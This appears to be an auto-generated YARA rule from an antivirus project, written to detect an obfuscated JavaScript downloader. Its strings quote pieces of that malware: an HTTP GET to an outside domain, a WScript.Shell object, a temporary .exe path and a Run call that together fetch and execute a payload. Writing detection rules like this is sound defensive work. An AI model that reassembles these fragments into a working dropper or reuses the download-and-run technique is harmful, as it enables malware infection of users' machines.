rule sig_20160330_699278d61bf51d8780f835c691cae135 {
  meta:
    description = "datamaliciousorder - file 20160330_699278d61bf51d8780f835c691cae135.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "640db4d64c4540cd3d64ac69e27e26a0a19b93d937f5b7da7c6b83c31ae20693"

  strings:
    $s1  = "G1[KO](\"GET\", \"http://beimeihuifu.com/n7dja\", false);" fullword ascii
    $s2  = "function H(XP, OU){B = B * 1; return XP - OU;};" fullword ascii
    $s3  = "var BT = function Y() {return WScript[XI](\"WScript\"+\".Shell\");}(), F1 = 11;" fullword ascii
    $s4  = "if (G1[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function YA(){return OG + \"\";};" fullword ascii
    $s6  = "function G() {return BT[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"voPvicwNz9.ex\" + \"e\";};" fullword ascii
    $s7  = "function A() {return ((T == true) && (T == UQ)) ? 1 : B;};" fullword ascii
    $s8  = "function F(Y0){BT[\"Run\"](Y0, B, B);};" fullword ascii
    $s9  = "var J = new this[\"Date\"]();" fullword ascii
    $s10 = "return H(X0, UY);" fullword ascii
    $s11 = "function QE()" fullword ascii
    $s12 = "function JI(){return 22;};" fullword ascii
    $s13 = "function X(IS) {var A0 = (1, 2, 3, 4, 5, IS); return A0;};" fullword ascii
    $s14 = "}while (NX);" fullword ascii
    $s15 = "function F0(){return XI;};" fullword ascii
    $s16 = "T = true; " fullword ascii
    $s17 = "var T = false;" fullword ascii
    $s18 = "var UQ = false;" fullword ascii
    $s19 = "var Y1 = false;" fullword ascii
    $s20 = "UQ = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}